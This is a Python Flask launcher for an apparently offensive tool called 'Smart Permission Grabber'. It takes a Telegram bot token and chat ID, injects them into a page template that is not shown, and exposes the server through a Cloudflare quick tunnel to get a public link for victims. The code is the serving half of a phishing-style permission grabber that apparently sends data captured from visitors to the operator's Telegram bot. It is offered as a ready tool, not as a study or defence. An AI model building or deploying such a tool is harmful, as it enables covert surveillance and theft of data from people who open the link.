import os
import subprocess
import time
from flask import Flask, render_template

app = Flask(__name__)

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""\033[1;32m
     __  __             _     _      _    _            _             
    |  \/  |           (_)   | |    | |  | |          | |            
    | \  / |_   _ _ __  _ ___| |__  | |__| | __ _  ___| | _____ _ __ 
    | |\/| | | | | '_ \| / __| '_ \ |  __  |/ _` |/ __| |/ / _ \ '__|
    | |  | | |_| | | | | \__ \ | | || |  | | (_| | (__|   <  __/ |   
    |_|  |_|\__,_|_| |_|_|___/_| |_||_|  |_|\__,_|\___|_|\_\___|_|   
    \033[1;31m[+] Developer: Munish Kumar
    \033[1;34m[+] Tool: Smart Permission Grabber
    \033[1;37m------------------------------------------------------------\033[0m""")

banner()
token = input("\033[1;33m[?] Enter your Bot Token: \033[0m")
chatid = input("\033[1;33m[?] Enter your Chat ID: \033[0m")

print("\n\033[1;36m[ Select Mode ]")
print("1. Localhost (For testing only)")
print("2. Cloudflare (For Online Link)\033[0m")
choice = input("\n[#] Select Option: ")

@app.route('/')
def index():
    return render_template('index.html', bot_token=token, chat_id=chatid)

if __name__ == '__main__':
    if choice == '2':
        print("\n\033[1;32m[*] Starting Cloudflare Tunnel... Please wait.\033[0m")
        # अब यह क्लाउडफ्लेयर का आउटपुट सीधा स्क्रीन पर दिखाएगा
        os.system("termux-chroot cloudflared tunnel --url http://127.0.0.1:8080 &")
        print("\033[1;33m[!] WAIT: Look for a link ending with '.trycloudflare.com' above.\033[0m")
        time.sleep(8) # लिंक आने का समय दें

    print("\n\033[1;32m[*] Flask Server starting on Port 8080...\033[0m")
    app.run(host='0.0.0.0', port=8080)
